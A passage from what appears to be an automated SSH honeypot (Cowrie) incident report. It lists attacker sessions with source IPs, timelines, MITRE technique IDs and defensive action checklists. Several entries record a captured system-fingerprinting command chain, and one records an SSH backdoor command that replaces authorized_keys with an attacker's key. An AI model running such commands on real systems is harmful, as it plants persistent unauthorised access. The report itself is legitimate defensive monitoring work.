| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:14:00` | `cowrie.session.connect` |
| `2026-07-09 18:14:00` | `cowrie.client.version` |
| `2026-07-09 18:14:00` | `cowrie.client.kex` |
| `2026-07-09 18:14:01` | `cowrie.login.success` |
| `2026-07-09 18:14:01` | `cowrie.session.params` |
| `2026-07-09 18:14:01` | `cowrie.command.input` |
| `2026-07-09 18:14:01` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.success` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.command.input` |
| `2026-07-09 18:14:02` | `cowrie.log.closed` |
| `2026-07-09 18:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d622460faf9

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-09 18:14 |
| **Last Seen** | 2026-07-09 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:14:14` | `cowrie.session.connect` |
| `2026-07-09 18:14:14` | `cowrie.client.version` |
| `2026-07-09 18:14:14` | `cowrie.client.kex` |
| `2026-07-09 18:14:16` | `cowrie.login.success` |
| `2026-07-09 18:14:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428bf390e91b

| Field | Detail |
|---|---|
| **Source IP** | `5.48.46[.]95` |
| **First Seen** | 2026-07-09 18:14 |
| **Last Seen** | 2026-07-09 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:14:21` | `cowrie.session.connect` |
| `2026-07-09 18:14:21` | `cowrie.client.version` |
| `2026-07-09 18:14:21` | `cowrie.client.kex` |
| `2026-07-09 18:14:22` | `cowrie.login.success` |
| `2026-07-09 18:14:23` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.48.46[.]95` to AbuseIPDB if not already reported
- [ ] Block `5.48.46[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a520a27baa48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:15 |
| **Last Seen** | 2026-07-09 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:15:52` | `cowrie.session.connect` |
| `2026-07-09 18:15:52` | `cowrie.client.version` |
| `2026-07-09 18:15:52` | `cowrie.client.kex` |
| `2026-07-09 18:15:52` | `cowrie.login.success` |
| `2026-07-09 18:15:53` | `cowrie.session.params` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.success` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.command.input` |
| `2026-07-09 18:15:53` | `cowrie.log.closed` |
| `2026-07-09 18:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edfdce11749

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:17 |
| **Last Seen** | 2026-07-09 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:17:49` | `cowrie.session.connect` |
| `2026-07-09 18:17:49` | `cowrie.client.version` |
| `2026-07-09 18:17:50` | `cowrie.client.kex` |
| `2026-07-09 18:17:50` | `cowrie.login.success` |
| `2026-07-09 18:17:51` | `cowrie.session.params` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.success` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.command.input` |
| `2026-07-09 18:17:51` | `cowrie.log.closed` |
| `2026-07-09 18:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a0683d76fb

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-07-09 18:18 |
| **Last Seen** | 2026-07-09 18:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:18:25` | `cowrie.session.connect` |
| `2026-07-09 18:18:25` | `cowrie.client.version` |
| `2026-07-09 18:18:25` | `cowrie.client.kex` |
| `2026-07-09 18:18:26` | `cowrie.login.success` |
| `2026-07-09 18:18:26` | `cowrie.session.params` |
| `2026-07-09 18:18:26` | `cowrie.command.input` |
| `2026-07-09 18:18:26` | `cowrie.command.failed` |
| `2026-07-09 18:18:26` | `cowrie.log.closed` |
| `2026-07-09 18:18:27` | `cowrie.session.params` |
| `2026-07-09 18:18:27` | `cowrie.command.input` |
| `2026-07-09 18:18:27` | `cowrie.session.file_download` |
| `2026-07-09 18:18:27` | `cowrie.log.closed` |
| `2026-07-09 18:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adfaca002ba7

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-07-09 18:18 |
| **Last Seen** | 2026-07-09 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:18:27` | `cowrie.session.connect` |
| `2026-07-09 18:18:27` | `cowrie.client.version` |
| `2026-07-09 18:18:27` | `cowrie.client.kex` |
| `2026-07-09 18:18:28` | `cowrie.login.success` |
| `2026-07-09 18:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f723eefb972e

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-07-09 18:18 |
| **Last Seen** | 2026-07-09 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:18:28` | `cowrie.session.connect` |
| `2026-07-09 18:18:28` | `cowrie.client.version` |
| `2026-07-09 18:18:28` | `cowrie.client.kex` |
| `2026-07-09 18:18:28` | `cowrie.login.success` |
| `2026-07-09 18:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc963e1468e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:19 |
| **Last Seen** | 2026-07-09 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:19:31` | `cowrie.session.connect` |
| `2026-07-09 18:19:31` | `cowrie.client.version` |
| `2026-07-09 18:19:31` | `cowrie.client.kex` |
| `2026-07-09 18:19:32` | `cowrie.login.success` |
| `2026-07-09 18:19:32` | `cowrie.session.params` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.success` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.command.input` |
| `2026-07-09 18:19:32` | `cowrie.log.closed` |
| `2026-07-09 18:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac1201a20c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:21 |
| **Last Seen** | 2026-07-09 18:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:21:03` | `cowrie.session.connect` |
| `2026-07-09 18:21:03` | `cowrie.client.version` |
| `2026-07-09 18:21:03` | `cowrie.client.kex` |
| `2026-07-09 18:21:03` | `cowrie.login.success` |
| `2026-07-09 18:21:05` | `cowrie.session.params` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.success` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.command.input` |
| `2026-07-09 18:21:05` | `cowrie.log.closed` |
| `2026-07-09 18:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6698584488c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:22 |
| **Last Seen** | 2026-07-09 18:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:22:33` | `cowrie.session.connect` |
| `2026-07-09 18:22:33` | `cowrie.client.version` |
| `2026-07-09 18:22:33` | `cowrie.client.kex` |
| `2026-07-09 18:22:33` | `cowrie.login.success` |
| `2026-07-09 18:22:35` | `cowrie.session.params` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.success` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.command.input` |
| `2026-07-09 18:22:35` | `cowrie.log.closed` |
| `2026-07-09 18:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e852a9a854c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:24 |
| **Last Seen** | 2026-07-09 18:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:24:02` | `cowrie.session.connect` |
| `2026-07-09 18:24:02` | `cowrie.client.version` |
| `2026-07-09 18:24:02` | `cowrie.client.kex` |
| `2026-07-09 18:24:03` | `cowrie.login.success` |
| `2026-07-09 18:24:04` | `cowrie.session.params` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.success` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.command.input` |
| `2026-07-09 18:24:04` | `cowrie.log.closed` |
| `2026-07-09 18:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09996c946df8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 18:26 |
| **Last Seen** | 2026-07-09 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:26:52` | `cowrie.session.connect` |
| `2026-07-09 18:26:52` | `cowrie.client.version` |
| `2026-07-09 18:26:52` | `cowrie.client.kex` |
| `2026-07-09 18:26:52` | `cowrie.login.success` |
| `2026-07-09 18:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11650ec8d31

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 18:26 |
| **Last Seen** | 2026-07-09 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:26:52` | `cowrie.session.connect` |
| `2026-07-09 18:26:52` | `cowrie.client.version` |
| `2026-07-09 18:26:52` | `cowrie.client.kex` |
| `2026-07-09 18:26:52` | `cowrie.login.success` |
| `2026-07-09 18:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4312de4df4c3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 18:26 |
| **Last Seen** | 2026-07-09 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:26:54` | `cowrie.session.connect` |
| `2026-07-09 18:26:54` | `cowrie.client.version` |
| `2026-07-09 18:26:54` | `cowrie.client.kex` |
| `2026-07-09 18:26:54` | `cowrie.login.success` |
| `2026-07-09 18:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b03665085b2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 18:27 |
| **Last Seen** | 2026-07-09 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:27:02` | `cowrie.session.connect` |
| `2026-07-09 18:27:02` | `cowrie.client.version` |
| `2026-07-09 18:27:02` | `cowrie.client.kex` |
| `2026-07-09 18:27:02` | `cowrie.login.success` |
| `2026-07-09 18:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020f0ae58a8f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:27 |
| **Last Seen** | 2026-07-09 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:27:13` | `cowrie.session.connect` |
| `2026-07-09 18:27:13` | `cowrie.client.version` |
| `2026-07-09 18:27:13` | `cowrie.client.kex` |
| `2026-07-09 18:27:13` | `cowrie.login.success` |
| `2026-07-09 18:27:14` | `cowrie.session.params` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.success` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:14` | `cowrie.command.input` |
| `2026-07-09 18:27:15` | `cowrie.log.closed` |
| `2026-07-09 18:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c25038b475

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]145` |
